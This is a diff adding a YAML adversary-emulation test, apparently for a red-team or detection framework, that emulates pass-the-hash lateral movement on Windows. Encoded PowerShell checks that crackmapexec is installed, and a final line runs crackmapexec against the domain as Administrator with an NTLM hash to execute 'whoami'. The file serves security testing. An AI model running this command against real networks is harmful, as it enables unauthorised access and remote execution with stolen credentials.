@@ -1,0 +1,16 @@
+- id: 7699e66f-4d88-5346-b751-e17bbacad57a
+  name: Soumaia ART Tests - crackmapexec Pass the Hash
+  description: command execute with crackmapexec
+  tactic: lateral-movement
+  technique:
+    attack_id: T1550.002
+    name: 'Use Alternate Authentication Material: Pass the Hash'
+  platforms:
+    windows:
+      cmd:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACgAVABlAHMAdAAtAFAAYQB0AGgAIABDADoAXABDAHIAYQBjAGsATQBhAHAARQB4AGUAYwBXAGkAbgBcAGMAcgBhAGMAawBtAGEAcABlAHgAZQBjAC4AZQB4AGUAKQAgAHsAZQB4AGkAdAAgADAAfQAgAGUAbABzAGUAIAB7AGUAeABpAHQAIAAxAH0ACgA=
+          if not "%ERRORLEVEL%"=="0" (
+              powershell -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAEEAdQB0AG8AbQBhAHQAZQBkACAAaQBuAHMAdABhAGwAbABlAHIAIABuAG8AdAAgAGkAbQBwAGwAZQBtAGUAbgB0AGUAZAAgAHkAZQB0ACwAIABwAGwAZQBhAHMAZQAgAGkAbgBzAHQAYQBsAGwAIABjAHIAYQBjAGsAbQBhAHAAZQB4AGUAYwAgAG0AYQBuAHUAYQBsAGwAeQAgAGEAdAAgAHQAaABpAHMAIABsAG8AYwBhAHQAaQBvAG4AOgAgAEMAOgBcAEMAcgBhAGMAawBNAGEAcABFAHgAZQBjAFcAaQBuAFwAYwByAGEAYwBrAG0AYQBwAGUAeABlAGMALgBlAHgAZQAKAA==
+          )
+          C:\CrackMapExecWin\crackmapexec.exe %userdnsdomain% -u Administrator -H cc36cf7a8514893efccd3324464tkg1a -x whoami
